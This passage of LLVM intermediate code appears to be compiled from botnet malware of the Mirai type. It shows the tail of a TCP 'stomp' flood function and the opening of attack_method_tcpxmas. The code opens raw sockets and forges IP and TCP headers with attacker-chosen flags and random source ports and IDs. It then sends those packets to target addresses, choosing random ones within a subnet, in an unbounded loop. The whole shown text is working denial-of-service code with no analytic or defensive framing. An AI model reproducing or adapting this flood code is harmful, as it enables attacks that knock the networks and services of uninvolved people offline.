  %327 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %328 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %327, i32 0, i32 3
  store i16 %326, i16* %328, align 4
  %329 = load i8, i8* %15, align 1
  %330 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %331 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %330, i32 0, i32 5
  store i8 %329, i8* %331, align 4
  %332 = load i8, i8* %16, align 1
  %333 = icmp ne i8 %332, 0
  br i1 %333, label %334, label %338

334:                                              ; preds = %243
  %335 = call zeroext i16 @htons(i16 noundef zeroext 16384) #8
  %336 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 4
  store i16 %335, i16* %337, align 2
  br label %338

338:                                              ; preds = %334, %243
  %339 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %340 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %339, i32 0, i32 6
  store i8 6, i8* %340, align 1
  %341 = load i32, i32* @LOCAL_ADDR, align 4
  %342 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 8
  store i32 %341, i32* %343, align 4
  %344 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %345 = load i32, i32* %9, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %344, i64 %346
  %348 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %347, i32 0, i32 0
  %349 = load i32, i32* %348, align 4
  %350 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 9
  store i32 %349, i32* %351, align 4
  %352 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %353 = load i32, i32* %9, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %355, i32 0, i32 3
  %357 = load i16, i16* %356, align 4
  %358 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %359 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %358, i32 0, i32 0
  store i16 %357, i16* %359, align 4
  %360 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %363, i32 0, i32 4
  %365 = load i16, i16* %364, align 2
  %366 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 1
  store i16 %365, i16* %367, align 2
  %368 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %371, i32 0, i32 2
  %373 = load i32, i32* %372, align 4
  %374 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %375 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %374, i32 0, i32 2
  store i32 %373, i32* %375, align 4
  %376 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %379, i32 0, i32 1
  %381 = load i32, i32* %380, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 3
  store i32 %381, i32* %383, align 4
  %384 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %385 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 4
  %387 = and i16 %386, -241
  %388 = or i16 %387, 128
  store i16 %388, i16* %385, align 4
  %389 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %390 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %389, i32 0, i32 4
  %391 = load i16, i16* %390, align 4
  %392 = and i16 %391, -257
  %393 = or i16 %392, 256
  store i16 %393, i16* %390, align 4
  %394 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 4
  %396 = load i16, i16* %395, align 4
  %397 = and i16 %396, -4097
  %398 = or i16 %397, 4096
  store i16 %398, i16* %395, align 4
  %399 = call i32 @rand_next()
  %400 = and i32 %399, 65535
  %401 = trunc i32 %400 to i16
  %402 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %403 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %402, i32 0, i32 5
  store i16 %401, i16* %403, align 2
  %404 = load i8, i8* %18, align 1
  %405 = sext i8 %404 to i16
  %406 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 4
  %408 = load i16, i16* %407, align 4
  %409 = and i16 %405, 1
  %410 = shl i16 %409, 13
  %411 = and i16 %408, -8193
  %412 = or i16 %411, %410
  store i16 %412, i16* %407, align 4
  %413 = load i8, i8* %19, align 1
  %414 = sext i8 %413 to i16
  %415 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 4
  %417 = load i16, i16* %416, align 4
  %418 = and i16 %414, 1
  %419 = shl i16 %418, 12
  %420 = and i16 %417, -4097
  %421 = or i16 %420, %419
  store i16 %421, i16* %416, align 4
  %422 = load i8, i8* %20, align 1
  %423 = sext i8 %422 to i16
  %424 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 4
  %426 = load i16, i16* %425, align 4
  %427 = and i16 %423, 1
  %428 = shl i16 %427, 11
  %429 = and i16 %426, -2049
  %430 = or i16 %429, %428
  store i16 %430, i16* %425, align 4
  %431 = load i8, i8* %21, align 1
  %432 = sext i8 %431 to i16
  %433 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %434 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %433, i32 0, i32 4
  %435 = load i16, i16* %434, align 4
  %436 = and i16 %432, 1
  %437 = shl i16 %436, 10
  %438 = and i16 %435, -1025
  %439 = or i16 %438, %437
  store i16 %439, i16* %434, align 4
  %440 = load i8, i8* %22, align 1
  %441 = sext i8 %440 to i16
  %442 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %443 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %442, i32 0, i32 4
  %444 = load i16, i16* %443, align 4
  %445 = and i16 %441, 1
  %446 = shl i16 %445, 9
  %447 = and i16 %444, -513
  %448 = or i16 %447, %446
  store i16 %448, i16* %443, align 4
  %449 = load i8, i8* %23, align 1
  %450 = sext i8 %449 to i16
  %451 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 4
  %453 = load i16, i16* %452, align 4
  %454 = and i16 %450, 1
  %455 = shl i16 %454, 8
  %456 = and i16 %453, -257
  %457 = or i16 %456, %455
  store i16 %457, i16* %452, align 4
  %458 = load i8*, i8** %38, align 8
  %459 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %458, i32 noundef %459)
  br label %491

460:                                              ; preds = %235, %227
  %461 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %462 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %461, i32 0, i32 4
  %463 = load i16, i16* %462, align 4
  %464 = lshr i16 %463, 8
  %465 = and i16 %464, 1
  %466 = zext i16 %465 to i32
  %467 = icmp ne i32 %466, 0
  br i1 %467, label %476, label %468

468:                                              ; preds = %460
  %469 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %470 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %469, i32 0, i32 4
  %471 = load i16, i16* %470, align 4
  %472 = lshr i16 %471, 10
  %473 = and i16 %472, 1
  %474 = zext i16 %473 to i32
  %475 = icmp ne i32 %474, 0
  br i1 %475, label %476, label %479

476:                                              ; preds = %468, %460
  %477 = load i32, i32* %26, align 4
  %478 = call i32 @close(i32 noundef %477)
  br label %121

479:                                              ; preds = %468
  br label %480

480:                                              ; preds = %479
  br label %481

481:                                              ; preds = %480, %215
  br label %482

482:                                              ; preds = %481, %211, %203
  %483 = call i64 @time(i64* noundef null) #7
  %484 = load i64, i64* %31, align 8
  %485 = sub nsw i64 %483, %484
  %486 = icmp sgt i64 %485, 10
  br i1 %486, label %487, label %490

487:                                              ; preds = %482
  %488 = load i32, i32* %26, align 4
  %489 = call i32 @close(i32 noundef %488)
  br label %121

490:                                              ; preds = %482
  br label %191

491:                                              ; preds = %338
  br label %492

492:                                              ; preds = %491, %124
  %493 = load i32, i32* %9, align 4
  %494 = add nsw i32 %493, 1
  store i32 %494, i32* %9, align 4
  br label %115, !llvm.loop !23

495:                                              ; preds = %115
  br label %496

496:                                              ; preds = %606, %495
  store i32 0, i32* %9, align 4
  br label %497

497:                                              ; preds = %603, %496
  %498 = load i32, i32* %9, align 4
  %499 = load i8, i8* %5, align 1
  %500 = zext i8 %499 to i32
  %501 = icmp slt i32 %498, %500
  br i1 %501, label %502, label %606

502:                                              ; preds = %497
  %503 = load i8**, i8*** %12, align 8
  %504 = load i32, i32* %9, align 4
  %505 = sext i32 %504 to i64
  %506 = getelementptr inbounds i8*, i8** %503, i64 %505
  %507 = load i8*, i8** %506, align 8
  store i8* %507, i8** %39, align 8
  %508 = load i8*, i8** %39, align 8
  %509 = bitcast i8* %508 to %struct.iphdr*
  store %struct.iphdr* %509, %struct.iphdr** %40, align 8
  %510 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %511 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %510, i64 1
  %512 = bitcast %struct.iphdr* %511 to %struct.tcphdr*
  store %struct.tcphdr* %512, %struct.tcphdr** %41, align 8
  %513 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %514 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %513, i64 1
  %515 = bitcast %struct.tcphdr* %514 to i8*
  store i8* %515, i8** %42, align 8
  %516 = load i16, i16* %14, align 2
  %517 = zext i16 %516 to i32
  %518 = icmp eq i32 %517, 65535
  br i1 %518, label %519, label %525

519:                                              ; preds = %502
  %520 = call i32 @rand_next()
  %521 = and i32 %520, 65535
  %522 = trunc i32 %521 to i16
  %523 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %524 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %523, i32 0, i32 3
  store i16 %522, i16* %524, align 4
  br label %525

525:                                              ; preds = %519, %502
  %526 = load i8, i8* %25, align 1
  %527 = icmp ne i8 %526, 0
  br i1 %527, label %528, label %531

528:                                              ; preds = %525
  %529 = load i8*, i8** %42, align 8
  %530 = load i32, i32* %24, align 4
  call void @rand_str(i8* noundef %529, i32 noundef %530)
  br label %531

531:                                              ; preds = %528, %525
  %532 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %533 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %532, i32 0, i32 7
  store i16 0, i16* %533, align 2
  %534 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %535 = bitcast %struct.iphdr* %534 to i16*
  %536 = call zeroext i16 @checksum_generic(i16* noundef %535, i32 noundef 20)
  %537 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %538 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %537, i32 0, i32 7
  store i16 %536, i16* %538, align 2
  %539 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %540 = load i32, i32* %9, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %539, i64 %541
  %543 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %542, i32 0, i32 1
  %544 = load i32, i32* %543, align 4
  %545 = add i32 %544, 1
  store i32 %545, i32* %543, align 4
  %546 = trunc i32 %544 to i16
  %547 = call zeroext i16 @htons(i16 noundef zeroext %546) #8
  %548 = zext i16 %547 to i32
  %549 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %550 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %549, i32 0, i32 2
  store i32 %548, i32* %550, align 4
  %551 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %552 = load i32, i32* %9, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %551, i64 %553
  %555 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %554, i32 0, i32 2
  %556 = load i32, i32* %555, align 4
  %557 = trunc i32 %556 to i16
  %558 = call zeroext i16 @htons(i16 noundef zeroext %557) #8
  %559 = zext i16 %558 to i32
  %560 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %561 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %560, i32 0, i32 3
  store i32 %559, i32* %561, align 4
  %562 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 6
  store i16 0, i16* %563, align 4
  %564 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %565 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %566 = bitcast %struct.tcphdr* %565 to i8*
  %567 = load i32, i32* %24, align 4
  %568 = sext i32 %567 to i64
  %569 = add i64 20, %568
  %570 = trunc i64 %569 to i16
  %571 = call zeroext i16 @htons(i16 noundef zeroext %570) #8
  %572 = load i32, i32* %24, align 4
  %573 = sext i32 %572 to i64
  %574 = add i64 20, %573
  %575 = trunc i64 %574 to i32
  %576 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* noundef %564, i8* noundef %566, i16 noundef zeroext %571, i32 noundef %575)
  %577 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %578 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %577, i32 0, i32 6
  store i16 %576, i16* %578, align 4
  %579 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %580 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %579, i32 0, i32 1
  %581 = load i16, i16* %580, align 2
  %582 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %583 = load i32, i32* %9, align 4
  %584 = sext i32 %583 to i64
  %585 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %582, i64 %584
  %586 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %585, i32 0, i32 0
  %587 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %586, i32 0, i32 1
  store i16 %581, i16* %587, align 2
  %588 = load i32, i32* %10, align 4
  %589 = load i8*, i8** %39, align 8
  %590 = load i32, i32* %24, align 4
  %591 = sext i32 %590 to i64
  %592 = add i64 40, %591
  %593 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %594 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %595 = load i32, i32* %9, align 4
  %596 = sext i32 %595 to i64
  %597 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %594, i64 %596
  %598 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %597, i32 0, i32 0
  %599 = bitcast %struct.sockaddr_in* %598 to %struct.sockaddr*
  store %struct.sockaddr* %599, %struct.sockaddr** %593, align 8
  %600 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %601 = load %struct.sockaddr*, %struct.sockaddr** %600, align 8
  %602 = call i64 @sendto(i32 noundef %588, i8* noundef %589, i64 noundef %592, i32 noundef 16384, %struct.sockaddr* %601, i32 noundef 16)
  br label %603

603:                                              ; preds = %531
  %604 = load i32, i32* %9, align 4
  %605 = add nsw i32 %604, 1
  store i32 %605, i32* %9, align 4
  br label %497, !llvm.loop !24

606:                                              ; preds = %497
  br label %496

607:                                              ; preds = %202, %111, %105
  ret void
}

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #4

; Function Attrs: nounwind
declare i64 @time(i64* noundef) #1

declare i64 @recvfrom(i32 noundef, i8* noundef, i64 noundef, i32 noundef, %struct.sockaddr*, i32* noundef) #4

; Function Attrs: nounwind
declare noalias i8* @malloc(i64 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @attack_method_tcpxmas(i8 noundef zeroext %0, %struct.attack_target* noundef %1, i8 noundef zeroext %2, %struct.attack_option* noundef %3) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.attack_stomp_data*, align 8
  %12 = alloca i8**, align 8
  %13 = alloca i8, align 1
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i16, align 2
  %18 = alloca i8, align 1
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i32, align 4
  %25 = alloca i8, align 1
  %26 = alloca i32, align 4
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca %struct.sockaddr_in, align 4
  %29 = alloca i32, align 4
  %30 = alloca [256 x i8], align 16
  %31 = alloca i64, align 8
  %32 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %33 = alloca i32, align 4
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca %struct.tcphdr*, align 8
  %36 = alloca %struct.iphdr*, align 8
  %37 = alloca %struct.tcphdr*, align 8
  %38 = alloca i8*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca %struct.iphdr*, align 8
  %41 = alloca %struct.tcphdr*, align 8
  %42 = alloca i8*, align 8
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %44 = load i8, i8* %5, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 noundef %45, i64 noundef 16) #7
  %47 = bitcast i8* %46 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %47, %struct.attack_stomp_data** %11, align 8
  %48 = load i8, i8* %5, align 1
  %49 = zext i8 %48 to i64
  %50 = call noalias i8* @calloc(i64 noundef %49, i64 noundef 8) #7
  %51 = bitcast i8* %50 to i8**
  store i8** %51, i8*** %12, align 8
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 noundef zeroext %52, %struct.attack_option* noundef %53, i8 noundef zeroext 2, i32 noundef 0)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %13, align 1
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 noundef zeroext %56, %struct.attack_option* noundef %57, i8 noundef zeroext 3, i32 noundef 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 noundef zeroext %60, %struct.attack_option* noundef %61, i8 noundef zeroext 4, i32 noundef 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 noundef zeroext %64, %struct.attack_option* noundef %65, i8 noundef zeroext 5, i32 noundef 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 noundef zeroext %68, %struct.attack_option* noundef %69, i8 noundef zeroext 7, i32 noundef 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 noundef zeroext %72, %struct.attack_option* noundef %73, i8 noundef zeroext 11, i32 noundef 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 noundef zeroext %76, %struct.attack_option* noundef %77, i8 noundef zeroext 12, i32 noundef 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 noundef zeroext %80, %struct.attack_option* noundef %81, i8 noundef zeroext 13, i32 noundef 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 noundef zeroext %84, %struct.attack_option* noundef %85, i8 noundef zeroext 14, i32 noundef 1)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 noundef zeroext %88, %struct.attack_option* noundef %89, i8 noundef zeroext 15, i32 noundef 1)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 noundef zeroext %92, %struct.attack_option* noundef %93, i8 noundef zeroext 16, i32 noundef 1)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 noundef zeroext %96, %struct.attack_option* noundef %97, i8 noundef zeroext 0, i32 noundef 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 noundef zeroext %99, %struct.attack_option* noundef %100, i8 noundef zeroext 1, i32 noundef 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 noundef 2, i32 noundef 3, i32 noundef 6) #7
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

105:                                              ; preds = %4
  br label %607

106:                                              ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 noundef %107, i32 noundef 0, i32 noundef 3, i8* noundef %108, i32 noundef 4) #7
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

111:                                              ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 noundef %112)
  br label %607

114:                                              ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

115:                                              ; preds = %492, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %495

120:                                              ; preds = %115
  br label %121

121:                                              ; preds = %487, %476, %120
  %122 = call i32 @socket(i32 noundef 2, i32 noundef 1, i32 noundef 0) #7
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

124:                                              ; preds = %121
  br label %492

125:                                              ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 noundef %127, i32 noundef 3, i32 noundef 0)
  %129 = or i32 %128, 2048
  %130 = call i32 (i32, i32, ...) @fcntl(i32 noundef %126, i32 noundef 4, i32 noundef %129)
  %131 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %131, align 4
  %132 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %133 = load i32, i32* %9, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %132, i64 %134
  %136 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %135, i32 0, i32 2
  %137 = load i8, i8* %136, align 4
  %138 = zext i8 %137 to i32
  %139 = icmp slt i32 %138, 32
  br i1 %139, label %140, label %161

140:                                              ; preds = %125
  %141 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %142 = load i32, i32* %9, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %141, i64 %143
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i32 0, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @ntohl(i32 noundef %146) #8
  %148 = call i32 @rand_next()
  %149 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %150 = load i32, i32* %9, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %149, i64 %151
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i32 0, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = lshr i32 %148, %155
  %157 = add i32 %147, %156
  %158 = call i32 @htonl(i32 noundef %157) #8
  %159 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %160 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %159, i32 0, i32 0
  store i32 %158, i32* %160, align 4
  br label %170

161:                                              ; preds = %125
  %162 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %163 = load i32, i32* %9, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %162, i64 %164
  %166 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %165, i32 0, i32 1
  %167 = load i32, i32* %166, align 4
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %169 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %168, i32 0, i32 0
  store i32 %167, i32* %169, align 4
  br label %170

170:                                              ; preds = %161, %140
  %171 = load i16, i16* %17, align 2
  %172 = zext i16 %171 to i32
  %173 = icmp eq i32 %172, 65535
  br i1 %173, label %174, label %179

174:                                              ; preds = %170
  %175 = call i32 @rand_next()
  %176 = and i32 %175, 65535
  %177 = trunc i32 %176 to i16
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %177, i16* %178, align 2
  br label %183

179:                                              ; preds = %170
  %180 = load i16, i16* %17, align 2
  %181 = call zeroext i16 @htons(i16 noundef zeroext %180) #8
  %182 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %181, i16* %182, align 2
  br label %183

183:                                              ; preds = %179, %174
  %184 = load i32, i32* %26, align 4
  %185 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %186 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %186, %struct.sockaddr** %185, align 8
  %187 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %188 = load %struct.sockaddr*, %struct.sockaddr** %187, align 8
  %189 = call i32 @connect(i32 noundef %184, %struct.sockaddr* %188, i32 noundef 16)
  %190 = call i64 @time(i64* noundef null) #7
  store i64 %190, i64* %31, align 8
  br label %191

191:                                              ; preds = %490, %183
  store i32 16, i32* %29, align 4
  %192 = load i32, i32* %10, align 4
  %193 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i64 0, i64 0
  %194 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %195 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %195, %struct.sockaddr** %194, align 8
  %196 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %197 = load %struct.sockaddr*, %struct.sockaddr** %196, align 8
  %198 = call i64 @recvfrom(i32 noundef %192, i8* noundef %193, i64 noundef 256, i32 noundef 16384, %struct.sockaddr* %197, i32* noundef %29)
